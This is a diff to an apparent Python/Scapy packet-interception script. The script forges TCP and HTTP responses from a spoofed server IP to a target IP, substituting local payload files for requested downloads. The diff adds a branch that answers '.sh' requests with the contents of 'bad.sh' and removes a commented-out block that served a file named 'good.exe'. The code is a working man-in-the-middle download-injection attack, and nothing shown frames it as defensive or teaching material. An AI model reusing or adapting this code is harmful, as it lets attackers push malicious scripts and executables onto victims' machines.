@@ -91,19 +91,22 @@ def q_callback(packet):
                                     )
                     response = IP(src=args.server_ip, dst=args.target_ip)/TCP(sport=tcp_pkt.dport, dport=tcp_pkt.sport,flags="FPA", seq=tcp_pkt.ack, ack=tcp_pkt.seq)
                     response = response / http_response / bad_content
-                    # http_response = HTTPResponse(
-                    #                     Status_Code=200,
-                    #                     Reason_Phrase=b"OK",
-                    #                     Headers=[
-                    #                         (b"Content-Type", b"application/octet-stream"),
-                    #                         (b"Content-Disposition", b"attachment; filename=good.exe"),
-                    #                         (b"Content-Length", str(len(bad_content)).encode()),
-                    #                     ],
-                    #                     body=bad_content
-                    #                 )
                     send(response)
                 elif path[-3:] == ".sh":
-                    print(".sh request received")
+                    with open("./bad.sh", "rb") as file:
+                        bad_content = file.read()
+
+                    http_response = HTTPResponse(
+                                        Http_Version=b'HTTP/1.1',
+                                        Status_Code=b'200',
+                                        Reason_Phrase=b'OK',
+                                        Server=b'SimpleHTTP/0.6 Python/2.7.6',
+                                        Content_Type=b'application/x-msdos-program',
+                                        Content_Length=str(len(bad_content)).encode()
+                                    )
+                    response = IP(src=args.server_ip, dst=args.target_ip)/TCP(sport=tcp_pkt.dport, dport=tcp_pkt.sport,flags="FPA", seq=tcp_pkt.ack, ack=tcp_pkt.seq)
+                    response = response / http_response / bad_content
+                    send(response)
 
     packet.accept()                       
 
